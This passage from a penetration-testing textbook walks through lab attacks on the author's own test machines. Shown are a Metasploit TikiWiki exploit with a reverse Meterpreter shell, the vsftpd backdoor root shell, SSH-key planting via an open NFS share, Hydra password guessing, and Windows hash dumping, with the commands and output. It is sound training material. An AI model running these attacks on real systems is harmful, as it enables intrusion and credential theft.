Based on the module names, unix/webapp/tikiwiki_graph_formula_exec u
looks like the one we need because it has graph_formula in its name. Our 
assumption is confirmed when we run info on the module. The OSVDB 
number v listed in the references for unix/webapp/tikiwiki_graph_formula_
exec matches our Nikto output from Chapter 6. 
The options for this module are different from our previous exploit 
examples, as shown in Listing 8-7. 
msf exploit(seattlelab_pass) > use unix/webapp/tikiwiki_graph_formula_exec
msf exploit(tikiwiki_graph_formula_exec) > show options
Module options (exploit/unix/webapp/tikiwiki_graph_formula_exec):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 Proxies no Use a proxy chainu
 RHOST yes The target address
 RPORT 80 yes The target port
 URI /tikiwiki yes TikiWiki directory pathv
 VHOST no HTTP server virtual hostw
Exploit target:
 Id Name
 -- ----
 0 Automatic
msf exploit(tikiwiki_graph_formula_exec) > set RHOST 192.168.20.11
RHOST => 192.168.20.11
Listing 8-7: Using the TikiWiki exploit 
We could set a proxy chain u and/or a virtual host w for the TikiWiki 
server, but we don‚Äôt need to here. We can leave the URI set to the default 
location /tikiwiki v.
This exploit involves PHP command execution, so naturally, our 
payloads are PHP based. Using the show payloads command (Listing 8-8) 
reveals that we can use PHP-based Meterpreter u as we did in our XAMPP 
exploit. We will also need to set our LHOST option v again.
Exploitation 193
msf exploit(tikiwiki_graph_formula_exec) > set payload php/meterpreter/reverse_tcpu
payload => php/meterpreter/reverse_tcp
msf exploit(tikiwiki_graph_formula_exec) > set LHOST 192.168.20.9v
LHOST => 192.168.20.110
msf exploit(tikiwiki_graph_formula_exec) > exploit
[*] Started reverse handler on 192.168.20.9:4444 
[*] Attempting to obtain database credentials...
[*] The server returned : 200 OK
[*] Server version : Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.6 with Suhosin-Patch
[*] TikiWiki database informations : 
db_tiki : mysql
dbversion : 1.9
host_tiki : localhost
user_tiki : tikiw
pass_tiki : tikipassword
dbs_tiki : tikiwiki
[*] Attempting to execute our payload...
[*] Sending stage (39217 bytes) to 192.168.20.11
[*] Meterpreter session 5 opened (192.168.20.9:4444 -> 192.168.20.11:54324) at 2015-01-07 
20:41:53 -0500
meterpreter > 
Listing 8-8: Exploiting TikiWiki with Metasploit 
As you can see, while exploiting the TikiWiki installation, the Metasploit module discovered the credentials w for the TikiWiki database. 
Unfortunately, the MySQL server is not listening on the network, so these 
credentials cannot be used for additional compromise. Still, we should note 
them because they might come in handy during post exploitation.
Exploiting a Compromised Servi
We noted in Chapter 6 that the FTP server on the Linux target serves a banner for Very Secure FTP 2.3.4, the version replaced with a binary containing 
a backdoor. Because the official code was eventually restored by the authors 
of Vsftpd, the only way to find out if the server on our Linux target has the 
backdoor code is to test it. (We don‚Äôt need to worry about potentially crashing the service if it‚Äôs not vulnerable: If this server doesn‚Äôt have the backdoor 
code, we‚Äôll just get a login error when we use the smiley face.)
Enter any username you like, and add a :) at the end (see Listing 8-9). 
Use anything for the password, as well. If the backdoor is present, it will 
trigger without valid credentials. 
root@kali:~# ftp 192.168.20.11
Connected to 192.168.20.11.
220 (vsFTPd 2.3.4)
194 Chapter 8
Name (192.168.20.11:root): georgia:)
331 Please specify the password.
Password:
Listing 8-9: Triggering the Vsftpd backdoor
We notice that the login hangs after the password. This tells us that the 
FTP server is still processing our login attempt, and if we query the FTP 
port again, it will continue to respond. Let‚Äôs use Netcat to try connecting 
to port 6200, where the root shell should spawn if the backdoor is present.
root@kali:~# nc 192.168.20.11 6200
# whoami
root
Sure enough, we have a root shell. Root privileges give us total control of 
our target machine. For example, we can get the system password hashes with 
the command cat /etc/shadow. Save the password hash for the user georgia
(georgia:$1$CNp3mty6$|RWcT0/PVYpDKwyaWWkSg/:15640:0:99999:7:::)to a 
file called linuxpasswords.txt. We will attempt to turn this hash into a plaintext password in Chapter 9.
Exploiting Open NFS S
At this point we know that the Linux target has exported user georgia‚Äôs 
home folder using NFS and that that share is available to anyone without 
the need for credentials. But this might not carry much security risk if we 
cannot use the access to read or write sensitive files.
Recall that when we scanned the NFS mount in Chapter 6, we saw the 
.ssh directory. This directory could contain the user‚Äôs private SSH keys as 
well as keys used for authenticating a user over SSH. Let‚Äôs see if we can 
exploit this share. Start by mounting the NFS share on your Kali system. 
root@kali:~# mkdir /tmp/mount
root@kali:~# mount -t nfs -o nolock 192.168.20.11:/export/georgia /tmp/mount
This doesn‚Äôt look too promising at first glance because georgia has no 
documents, pictures, or videos‚Äîjust some simple buffer overflow examples 
we will use in Chapter 16. There doesn‚Äôt appear to be any sensitive information here, but before we jump to conclusions, let‚Äôs see what‚Äôs in the .ssh
directory. 
root@kali:~# cd /tmp/mount/.ssh
root@kali:/tmp/mount/.ssh# ls
authorized_keys id_rsa id_rsa.pub
We now have access to georgia‚Äôs SSH keys. The id_rsa file is her private 
key, and id_rsa.pub is her corresponding public key. We can read or even 
change these values, and we can write to the SSH file authorized_keys, which 
Exploitation 195
handles a list of SSH public keys that are authorized to log in as the user 
georgia. And because we have write privileges, we can add our own key here 
that will allow us to bypass password authentication when logging in to the 
Ubuntu target as georgia, as shown in Listing 8-10.
root@kali:~# ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
26:c9:b7:94:8e:3e:d5:04:83:48:91:d9:80:ec:3f:39 root@kali
The key's randomart image is:
+--[ RSA 2048]----+
| . o+B . |
--snip--
+-----------------+
Listing 8-10: Generating a new SSH key pair
First, we generate a key on our Kali machine using ssh-keygen. By 
default our new public key is written to /root/.ssh/id_rsa.pub, and our private key is written to /root/.ssh/id_rsa. We want to add our public key to the 
authorized_keys file for georgia on Ubuntu.
Next, let‚Äôs append the newly generated public key to georgia‚Äôs authorized_
keys file. cat out the contents of the /root/.ssh/id_rsa.pub file, and append it to 
georgia‚Äôs authorized_keys file.
root@kali:~# cat ~/.ssh/id_rsa.pub >> /tmp/mount/.ssh/authorized_keys
We should now be able to SSH into the Linux target as georgia. Let‚Äôs 
give it a try. 
root@kali:~# ssh georgia@192.168.20.11
georgia@ubuntu:~$ 
That worked nicely. We can now successfully authenticate with the 
Linux target using public key authentication. 
We could also have gained access by copying georgia‚Äôs key to the Kali 
machine. To do so, we first delete the SSH identity we created.
root@kali:/tmp/mount/.ssh# rm ~/.ssh/id_rsa.pub 
root@kali:/tmp/mount/.ssh# rm ~/.ssh/id_rsa
Now, we copy georgia‚Äôs private key (id_rsa) and public key (id_rsa.pub) to 
root‚Äôs .ssh directory on Kali, and use the ssh-add command to add the identity to the authentication agent before we try to SSH into the Linux target. 
196 Chapter 8
root@kali:/tmp/mount/.ssh# cp id_rsa.pub ~/.ssh/id_rsa.pub
root@kali:/tmp/mount/.ssh# cp id_rsa ~/.ssh/id_rsa
root@kali:/tmp/mount/.ssh# ssh-add
Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)
root@kali:/tmp/mount/.ssh# ssh georgia@192.168.20.11
Linux ubuntu 2.6.27-7-generic #1 SMP Fri Oct 24 06:42:44 UTC 2008 i686
georgia@ubuntu:~$
Again, we are able to gain access to the target by manipulating the SSH 
keys. We started with the ability to read and write files in georgia‚Äôs home 
directory. Now we have a shell on the Linux system as user georgia without 
needing a password. 
Summar
In this chapter we were able to combine the information we gathered in 
Chapter 5 with the vulnerabilities discovered in Chapter 6 to exploit multiple compromises on both the Windows XP and Linux targets. We used 
various techniques, including attacking misconfigured web servers, piggybacking on backdoored software, taking advantage of poor access control 
to sensitive files, exploiting vulnerabilities in the underlying system, and 
exploiting issues in third-party software. 
Now that we‚Äôve managed to get a foothold in the systems, in the next 
chapter, let‚Äôs turn to cracking the passwords we found on the systems. 
9
Passwor  Attac
Passwords are often the path of least resistance on 
pentesting engagements. A client with a strong security program can fix missing Windows patches and 
out-of-date software, but the users themselves can‚Äôt be 
patched. We‚Äôll look at attacking users when we discuss 
social engineering in Chapter 11, but if we can correctly guess or calculate 
a user‚Äôs password, we may be able to avoid involving the user in the attack at 
all. In this chapter we‚Äôll look at how to use tools to automate running services 
on our targets and sending usernames and passwords. Additionally, we‚Äôll 
study cracking the password hashes we gained access to in Chapter 8.
Password Managemen
Companies are waking up to the inherent risks of password-based authentication; brute-force attacks and educated guesses are both serious risks to 
weak passwords. Many organizations use biometric (fingerprint or retinal 
198 Chapter 9
scan-based) or two-factor authentication to mitigate these risks. Even web 
services such as Gmail and Dropbox offer two-factor authentication in 
which the user provides a password as well as a second value, such as the 
digits on an electronic token. If two-factor authentication is not available, 
using strong passwords is imperative for account security because all that 
stands between the attacker and sensitive data may come down to a simple 
string. Strong passwords are long, use characters from multiple complexity 
classes, and are not based on a dictionary word.
The passwords we use in this book are deliberately terrible, but unfortunately, many users don‚Äôt behave much better when it comes to passwords. 
Organizations can force users to create strong passwords, but as passwords 
become more complex, they become harder to remember. Users are likely 
to leave a password that they can‚Äôt remember in a file on their computer, in 
their smartphone, or even on a Post-it note, because it‚Äôs just easier to keep 
of track them that way. Of course, passwords that can be discovered lying 
around in plaintext undermine the security of using a strong password.
Another cardinal sin of good password management is using the same 
password on many sites. In a worst-case scenario, the CEO‚Äôs weak password 
for a compromised web forum might just be the very same one for his or 
her corporate access to financial documents. Password reuse is something 
to bear in mind while performing password attacks; you may find the same 
passwords work on multiple systems and sites. 
Password management presents a difficult problem for IT staff and will 
likely continue to be a fruitful avenue for attackers unless or until passwordbased authentication is phased out entirely in favor of another model. 
Online Password Attack
Just as we used automated scans to find vulnerabilities, we can use scripts to 
automatically attempt to log in to services and find valid credentials. We‚Äôll 
use tools designed for automating online password attacks or guessing passwords until the server responds with a successful login. These tools use a 
technique called brute forcing. Tools that use brute forcing try every possible 
username and password combination, and given enough time, they will find 
valid credentials. 
The trouble with brute forcing is that as stronger passwords are used, 
the time it takes to brute-force them moves from hours to years and even 
beyond your natural lifetime. We can probably find working credentials 
more easily by feeding educated guesses about the correct passwords into 
an automated login tool. Dictionary words are easy to remember, so despite 
the security warnings, many users incorporate them into passwords. Slightly 
more security-conscious users might put some numbers at the end of their 
password or maybe even an exclamation point. 
Password Attacks 199
Wordlists 
Before you can use a tool to guess passwords, you need a list of credentials 
to try. If you don‚Äôt know the name of the user account you want to crack, or 
you just want to crack as many accounts as possible, you can provide a username list for the password-guessing tool to iterate through. 
User Lists
When creating a user list, first try to determine the client‚Äôs username scheme. 
For instance, if we‚Äôre trying to break into employee email accounts, figure 
out the pattern the email addresses follow. Are they firstname.lastname, just a 
first name, or something else? 
You can look for good username candidates on lists of common first or 
last names. Of course, the guesses will be even more likely to succeed if you 
can find the names of your target‚Äôs actual employees. If a company uses a 
first initial followed by a last name for the username scheme, and they have 
an employee named John Smith, jsmith is likely a valid username. Listing 9-1 
shows a very short sample user list. You‚Äôd probably want a larger list of users 
in an actual engagement. 
root@kali:~# cat userlist.txt 
georgia
john
mom
james
Listing 9-1: Sample user list 
Once you‚Äôve created your list, save the sample usernames in a text file 
in Kali Linux, as shown in Listing 9-1. You‚Äôll use this list to perform online 
password attacks in ‚ÄúGuessing Usernames and Passwords with Hydra‚Äù on 
page 202. 
Password Lists
In addition to a list of possible users, we‚Äôll also need a password list, as 
shown in Listing 9-2.
root@kali:~# cat passwordfile.txt
password
Password
password1
Password1
Password123
password123 
Listing 9-2: Sample password list 
200 Chapter 9
Like our username list, this password list is just a very short example 
(and one that, hopefully, wouldn‚Äôt find the correct passwords for too many 
accounts in the real world). On a real engagement, you should use a much 
longer wordlist. 
There are many good password lists available on the Internet. Good 
places to look for wordlists include http://packetstormsecurity.com/Crackers/
wordlists/ and http://www.openwall.com/wordlists/. A few password lists are also 
built into Kali Linux. For example, the /usr/share/wordlists directory contains a file called rockyou.txt.gz. This is a compressed wordlist. If you unzip 
the file with the gunzip Linux utility, you‚Äôll have about 140 MB of possible 
passwords, which should give you a pretty good start. Also, some of the 
password-cracking tools in Kali come with sample wordlists. For example, 
the John the Ripper tool (which we‚Äôll use in ‚ÄúOffline Password Attacks‚Äù on 
page 203) includes a wordlist at /usr/share/john/password.lst. 
For better results, customize your wordlists for a particular target by 
including additional words. You can make educated guesses based on information you gather about employees online. Information about spouses, 
children, pets, and hobbies may put you on the right track. For example, 
if your target‚Äôs CEO is a huge Taylor Swift fan on social media, consider 
adding keywords related to her albums, her music, or her boyfriends. If 
your target‚Äôs password is TaylorSwift13!, you should be able to confirm it 
using password guessing long before you have to run a whole precompiled 
wordlist or a brute-force attempt. Another thing to keep in mind is the 
language(s) used by your target. Many of your pentesting targets may be 
global. 
In addition to making educated guesses based on information you 
gather while performing reconnaissance, a tool like the ceWL custom 
wordlist generator will search a company website for words to add to 
your wordlist. Listing 9-3 shows how you might use ceWL to create a 
wordlist based on the contents of www.bulbsecurity.com.
root@kali:~# cewl --help
cewl 5.0 Robin Wood (robin@digininja.org) (www.digininja.org)
Usage: cewl [OPTION] ... URL
--snip--
--depth x, -d x: depth to spider to, default 2 u
--min_word_length, -m: minimum word length, default 3 v
--offsite, -o: let the spider visit other sites
--write, -w file: write the output to the file w
--ua, -u user-agent: useragent to send
--snip--
URL: The site to spider.
root@kali:~# cewl -w bulbwords.txt -d 1 -m 5 www.bulbsecurity.com x
Listing 9-3: Using ceWL to build custom wordlists 
Password Attacks 201
The command ceWL --help lists ceWL‚Äôs usage instructions. Use the -d
(depth) option u to specify how many links ceWL should follow on the 
target website. If you think that your target has a minimum password-size 
requirement, you might specify a minimum word length to match with the 
-m option v. Once you‚Äôve made your choices, output ceWL‚Äôs results to a file 
with the -w option w. For example, to search www.bulbsecurity.com to depth 
1 with minimum word length of 5 characters and output the words found to 
the file bulbwords.txt, you would use the command shown at x. The resulting 
file would include all words found on the site that meet your specifications. 
Another method for creating wordlists is producing a list of every possible combination of a given set of characters, or a list of every combination 
of characters for a specified number of characters. The tool Crunch in Kali 
will generate these character sets for you. Of course, the more possibilities, 
the more disk space is required for storage. A very simple example of using 
Crunch is shown in Listing 9-4. 
root@kali:~# crunch 7 7 AB
Crunch will now generate the following amount of data: 1024 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 128 
AAAAAAA
AAAAAAB
--snip--
Listing 9-4: Brute-forcing a keyspace with Crunch
This example generates a list of all the possible seven-character combinations of just the characters A and B. A more useful, but much, much 
larger example would be entering crunch 7 8, which would generate a list 
of all the possible combinations of characters for a string between seven 
and eight characters in length, using the default Crunch character set of 
lowercase letters. This technique is known as keyspace brute-forcing. While 
it is not feasible to try every possible combination of characters for a password in the span of your natural life, it is possible to try specific subsets; for 
instance, if you knew the client‚Äôs password policy requires passwords to be at 
least seven characters long, trying all seven- and eight-character passwords 
would probably result in cracking success‚Äîeven among the rare users who 
did not base their passwords on a dictionary word. 
N ote Developing a solid wordlist or set of wordlists is a constantly evolving process. For the
exercises in this chapter, you can use the short sample wordlist we created in Listing 9-2, 
but as you gain experience in the field, you‚Äôll develop more complex lists that work 
well on client engagements. 
Now let‚Äôs see how to use our wordlist to guess passwords for services 
running on our targets. 
202 Chapter 9
Guessing Usernames and Passwords with Hydra
If you have a set of credentials that you‚Äôd like to try against a running service 
that requires a login, you can input them manually one by one or use a tool 
to automate the process. Hydra is an online password-guessing tool that can 
be used to test usernames and passwords for running services. (Following 
the tradition of naming security tools after the victims of Heracles‚Äôs labors, 
Hydra is named for the mythical Greek serpent with many heads.) Listing 9-5 
shows an example of using Hydra for online password guessing. 
root@kali:~# hydra -L userlist.txt -P passwordfile.txt 192.168.20.10 pop3
Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only
Hydra (http://www.thc.org/thc-hydra) starting at 2015-01-12 15:29:26
[DATA] 16 tasks, 1 server, 24 login tries (l:4/p:6), ~1 try per task
[DATA] attacking service pop3 on port 110
[110][pop3] host: 192.168.20.10 login: georgia password: passwordu
[STATUS] attack finished for 192.168.20.10 (waiting for children to finish)
1 of 1 target successfuly completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2015-01-12 15:29:48
Listing 9-5: Using Hydra to guess POP3 usernames and passwords 
Listing 9-5 shows how to use Hydra to guess usernames and passwords 
by running through our username and password files to search for valid 
POP3 credentials on our Windows XP target. This command uses the -L
flag to specify the username file, the -P for the password list file, and specifies the protocol pop3. Hydra finds that user georgia‚Äôs password is password at 
u. (Shame on georgia for using such an insecure password!) 
Sometimes you‚Äôll know that a specific username exists on a server, and 
you just need a valid password to go with it. For example, we used the SMTP 
VRFY verb to find valid usernames on the SLMail server on the Windows XP 
target in Chapter 6. As you can see in Listing 9-6, we can use the -l flag 
instead of -L to specify one particular username. Knowing that, let‚Äôs look 
for a valid password for user georgia on the pop3 server. 
root@kali:~# hydra -l georgia -P passwordfile.txt 192.168.20.10 pop3
Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only 
[DATA] 16 tasks, 1 server, 24 login tries (l:4/p:6), ~1 try per task
[DATA] attacking service pop3 on port 110
[110][pop3] host: 192.168.20.10 login: georgia password: passwordu
[STATUS] attack finished for 192.168.20.10 (waiting for children to finish)
1 of 1 target successfuly completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2015-01-07 20:22:23
Listing 9-6: Using a specific username with Hydra
Hydra found georgia‚Äôs password to be password u. 
Now, in Listing 9-7, we‚Äôll use our credentials to read georgia‚Äôs email.
root@kali:~# nc 192.168.20.10 pop3
+OK POP3 server xpvictim.com ready <00037.23305859@xpvictim.com>
Password Attacks 203
USER georgia
+OK georgia welcome here
PASS password
+OK mailbox for georgia has 0 messages (0 octets)
Listing 9-7: Using Netcat to log in with guessed credentials
Specify the pop3 protocol, and provide the username and password 
when prompted. (Unfortunately, there are no love letters in this particular 
inbox.) Hydra can perform online password guessing against a range of services. (See its manual page for a complete list.) For example, here we use 
the credentials we found with Hydra to log in with Netcat. 
Keep in mind that most services can be configured to lock out accounts 
after a certain number of failed login attempts. There are few better ways 
to get noticed by a client‚Äôs IT staff than suddenly locking out several user 
accounts. Logins in rapid succession can also tip off firewalls and intrusionprevention systems, which will get your IP address blocked at the perimeter. 
Slowing down and randomizing scans can help with this, but there is, of 
course, a tradeoff: Slower scans will take longer to produce results. 
One way to avoid having your login attempts noticed is to try to guess a 
password before trying to log in, as you‚Äôll learn in the next section. 
Offline Password Attack
Another way to crack passwords (without being discovered) is to get a copy 
of the password hashes and attempt to reverse them back to plaintext passwords. This is easier said than done because hashes are designed to be the 
product of a one-way hash function: Given an input, you can calculate the 
output using the hash function, but given the output, there is no way to 
reliably determine the input. Thus, if a hash is compromised, there should 
be no way to calculate the plaintext password. We can, however, guess a 
password, hash it with the one-way hash function, and compare the results 
to the known hash. If the two hashes are the same, we‚Äôve found the correct 
password. 
N ote As you‚Äôll learn in ‚ÄúLM vs. NTLM Hashing Algorithms‚Äù on page 208, not all password hashing systems have stood the test of time. Some have been cracked and are no
longer considered secure. In these cases, regardless of the strength of the password chosen, an attacker with access to the hashes will be able to recover the plaintext password 
in a reasonable amount of time.
Of course, it‚Äôs even better if you can get access to passwords in plaintext and save yourself the trouble of trying to reverse the cryptography, but 
often the passwords you encounter will be hashed in some way. In this section 
we‚Äôll focus on finding and reversing password hashes. If you stumble upon a 
program configuration file, database, or other file that stores passwords in 
plaintext, all the better. 
But before we can try to crack password hashes, we have to find them. 
We all hope that the services that store our passwords do a good job of 
204 Chapter 9
protecting them, but that‚Äôs never a given. It only takes one exploitable flaw or 
a user who falls victim to a social-engineering attack (discussed in Chapter 11) 
to bring down the whole house of cards. You‚Äôll find plenty of password hashes 
lying around sites like Pastebin, remnants from past security breaches. 
In Chapter 8, we gained access to some password hashes on the Linux 
and Windows XP targets. Having gained a Meterpreter session with system 
privileges on the Windows XP system via the windows/smb/ms08_067_netapi
Metasploit module, we can use the hashdump Meterpreter command to print 
the hashed Windows passwords, as shown in Listing 9-8. 
meterpreter > hashdump
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
georgia:1003:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:df40c521ef762bb7b9767e30ff112a3c:938ce7d211ea733373bcfc3e6fbb3641:::
secret:1004:e52cac67419a9a22664345140a852f61:58a478135a93ac3bf058a5ea0e8fdb71:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:bc48640a0fcb55c6ba1c9955080a52a8:::
Listing 9-8: Dumping password hashes in Meterpreter
Save the output of the hashdump to a file called xphashes.txt, which we 
will use in ‚ÄúJohn the Ripper‚Äù on page 210.
In Chapter 8 we also downloaded backups of the SAM and SYSTEM 
hives using the local file inclusion issue in Zervit 0.4 on the Windows XP 
system. We used this same issue to download the configuration file for 
the FileZilla FTP server, which contained passwords hashed with the MD5 
algorithm. On the Linux target, the Vsftpd smiley-face backdoor gave us 
root privileges, and thus we can access to the file /etc/shadow, which stores 
Linux password hashes. We saved the password for user georgia to the file 
linuxpasswords.txt.
Recovering Password Hashes from a Windows SAM File
The SAM file stores hashed Windows passwords. Though we were able to use 
Meterpreter to dump the password hashes from the Windows XP system (as 
shown previously), sometimes you‚Äôll be able to get only the SAM file. 
We weren‚Äôt able to get access to the primary SAM file through the 
Zervit 0.4 vulnerability, but we were able to download a backup copy from 
the C:\Windows\repair directory using a local file-inclusion vulnerability. But 
when we try to read the SAM file (as shown in Listing 9-9), we don‚Äôt see any 
password hashes.
root@bt:~# cat sam
regf P P5gfhbinÔøΩÔøΩÔøΩÔøΩnk,ÔøΩuÔøΩÔøΩÔøΩÔøΩÔøΩ ÔøΩÔøΩÔøΩÔøΩ ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩxÔøΩÔøΩÔøΩÔøΩSAMXÔøΩÔøΩÔøΩskx x ÔøΩ ÔøΩpÔøΩ¬µ\¬µ? 
? ¬µ ¬µ 
 ÔøΩÔøΩÔøΩÔøΩnk LÔøΩÔøΩÔøΩÔøΩ ÔøΩBÔøΩÔøΩÔøΩÔøΩ ÔøΩx ÔøΩÔøΩÔøΩÔøΩÔøΩSAMÔøΩÔøΩÔøΩÔøΩskxx7d 
ÔøΩHX¬µ4¬µ? ÔøΩÔøΩÔøΩÔøΩvk ÔøΩ CPÔøΩÔøΩÔøΩ ÔøΩ ¬µÔøΩxÔøΩ¬µD0ÔøΩ¬µ ÔøΩ¬µÔøΩÔøΩ 4¬µ1 ? ÔøΩÔøΩÔøΩÔøΩÔøΩ 
ÔøΩÔøΩÔøΩÔøΩlf SAMÔøΩÔøΩÔøΩÔøΩnk ÔøΩuÔøΩÔøΩÔøΩÔøΩÔøΩ H#ÔøΩÔøΩÔøΩÔøΩ Px ÔøΩÔøΩÔøΩÔøΩDomainsÔøΩÔøΩÔøΩÔøΩvkÔøΩÔøΩÔøΩÔøΩÔøΩ8lf ÔøΩDomaÔøΩÔøΩÔøΩÔøΩnk 
\ÔøΩÔøΩJÔøΩÔøΩÔøΩ ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ0x ÔøΩÔøΩÔøΩÔøΩ( AccountÔøΩÔøΩÔøΩÔøΩvk ÔøΩÔøΩ
--snip--
Listing 9-9: Viewing the SAM file
Password Attacks 205
The SAM file is obfuscated because the Windows Syskey utility encrypts 
the password hashes inside the SAM file with 128-bit Rivest Cipher 4 (RC4) 
to provide additional security. Even if an attacker or pentester can gain 
access to the SAM file, there‚Äôs a bit more work to do before we can recover the 
password hashes. Specifically, we need a key to reverse the encrypted hashes. 
The encryption key for the Syskey utility is called the bootkey, and it‚Äôs 
stored in the Windows SYSTEM file. You‚Äôll find a copy of the SYSTEM file in 
the C:\Windows\repair directory where we found the backup SAM file. We can 
use a tool in Kali called Bkhive to extract the Syskey utility‚Äôs bootkey from the 
SYSTEM file so we can decrypt the hashes, as shown in Listing 9-10.
root@kali:~# bkhive system xpkey.txt
bkhive 1.1.1 by Objectif Securite
http://www.objectif-securite.ch
original author: ncuomo@studenti.unina.it
Root Key : $$$PROTO.HIV
Default ControlSet: 001
Bootkey: 015777ab072930b22020b999557f42d5
Listing 9-10: Using Bkhive to extract the bootkey
Here we use Bkhive to extract the bootkey by passing in the SYSTEM 
file system (the file we downloaded from the repair directory using the 
Zervit 0.4 directory traversal) as the first argument and extracting the file 
to xpkey.txt. Once we have the bootkey, we can use Samdump2 to retrieve 
the password hashes from the SAM file, as shown in Listing 9-11. Pass 
Samdump2 the location of the SAM file and the bootkey from Bkhive as 
arguments, and it will use the bootkey to decrypt the hashes. 
root@kali:~# samdump2 sam xpkey.txt
samdump2 1.1.1 by Objectif Securite
http://www.objectif-securite.ch
original author: ncuomo@studenti.unina.it
Root Key : SAM
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:df40c521ef762bb7b9767e30ff112a3c:938ce7d211ea733373bcfc3e6fbb3641:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:bc48640a0fcb55c6ba1c9955080a52a8:::
Listing 9-11: Using Samdump2 to recover Windows hashes 
Now compare these hashes to those found with the hashdump command 
in an active Meterpreter session from Listing 9-8. (A Meterpreter session 
with sufficient privileges can dump password hashes on the fly without 
requiring us to download the SAM and SYSTEM files.) Notice that our hash 
list in Listing 9-11 lacks entries for the users georgia or secret. What happened?
When using the Zervit directory traversal, we weren‚Äôt able to access 
the main SAM file at C:\Windows\System32\config and instead downloaded 
a backup from C:\Windows\repair\sam. These users must have been created 
206 Chapter 9
after the SAM file backup was created. We do have a password hash for the 
Administrator user, though. Though not complete or fully up-to-date, we may 
still be able to use cracked hashes from this backup SAM to log in to the 
systems. 
Now let‚Äôs look at another way to access password hashes. 
Dumping Password Hashes with Physical Access
On some engagements, you‚Äôll actually have physical access to user machines, 
with so-called physical attacks in scope. While having physical access may 
not appear very useful at first, you may be able to access the password hashes 
by restarting a system using a Linux Live CD to bypass security controls. 
(We‚Äôll use a Kali ISO image, though other Linux Live CDs such as Helix 
or Ubuntu will work. We used a prebuilt Kali virtual machine in Chapter 1. 
To get a standalone ISO of Kali, go to http://www.kali.org.) When you boot 
a machine with a Live CD, you can mount the internal hard disk and gain 
access to all files, including the SAM and SYSTEM files. (When Windows 
boots, there are certain security controls in place to stop users from accessing the SAM file and dumping password hashes, but these aren‚Äôt active when 
the filesystem is loaded in Linux.)
Our Windows 7 virtual machine, with its solid external security posture, 
has been a bit neglected in these last few chapters. Let‚Äôs dump its hashes 
using a physical attack. First, we‚Äôll point our virtual machine‚Äôs optical drive 
to a Kali ISO file, as shown in Figure 9-1 (for VMware Fusion). In VMware 
Player, highlight your Windows 7 virtual machine, right-click it and choose 
Settings, then choose CD/DVD (SATA) and point to the ISO in the Use 
ISO Image field on the right side of the page.
Figure 9-1: Setting our Windows 7 virtual machine to boot from the Kali 
ISO file
By default, VMware will boot up the virtual machine so quickly that 
it will be difficult to change the BIOS settings to boot from the CD/DVD 
drive instead of the hard disk. To fix this, we‚Äôll add a line to the VMware 
configuration file (.vmx) to delay the boot process at the BIOS screen for 
a few seconds. 
Password Attacks 207
1. On your host machine, browse to where you saved your virtual machines. 
Then, in the folder for the Windows 7 target, find the .vmx configuration file, and open it in a text editor. The configuration file should look 
similar to Listing 9-12.
.encoding = "UTF-8"
config.version = "8"
virtualHW.version = "9"
vcpu.hotadd = "TRUE"
scsi0.present = "TRUE"
scsi0.virtualDev = "lsilogic"
--snip--
Listing 9-12: VMware configuration file (.vmx
2. Add the line bios.bootdelay = 3000 anywhere in the file. This tells the 
virtual machine to delay booting for 3000 ms, or three seconds, enough 
time for us to change the boot options.
3. Save the .vmx file, and restart the Windows 7 target. Once you can access 
the BIOS, choose to boot from the CD drive. The virtual machine should 
start the Kali ISO. Even though we‚Äôre booted into Kali, we can mount the 
Windows hard disk and access files, bypassing the security features of 
the Windows operating system. 
Listing 9-13 shows how to mount the file system and dump the password 
hashes. 
root@kali:# umkdir -p /mnt/sda1
root@kali:# vmount /dev/sda1 /mnt/sda1
root@kali:# wcd /mnt/sda1/Windows/System32/config/
root@kali:/mnt/sda1/Windows/System32/config bkhive SYSTEM out
root@kali:/mnt/sda1/Windows/System32/config samdump2 SAM out 
samdump2 1.1.1 by Objectif Securite 
http://www.objectif-securite.ch 
original author: ncuomo@studenti.unina.it 
Root Key : CMI-CreateHive{899121E8-11D8-41B6-ACEB-301713D5ED8C}
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
Georgia Weidman:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b75B6c::: 
Listing 9-13: Dumping Windows hashes with a Linux Live CD
We create a directory where we can mount our Windows filesystem with 
the mkdir command at u. Next, we use mount v to mount the Windows filesystem (/dev/sda1) in the newly created directory (/mnt/sda1), which means 
that the target‚Äôs C drive is effectively at /mnt/sda1. The SAM and SYSTEM 
files in Windows are in the C:\Windows\System32\config directory, so we change 
directories to /mnt/sda1/Windows/System32/config to access these files using 
208 Chapter 9
cd w, at which point we can use Samdump2 and Bkhive against the SAM 
and SYSTEM files without first saving these files and moving them to our 
Kali system. 
Once again we‚Äôve managed to get access to password hashes. We now 
have hashes for our Windows XP target, our Windows 7 target, our Linux 
target, and the FileZilla FTP server on the Windows XP target. 
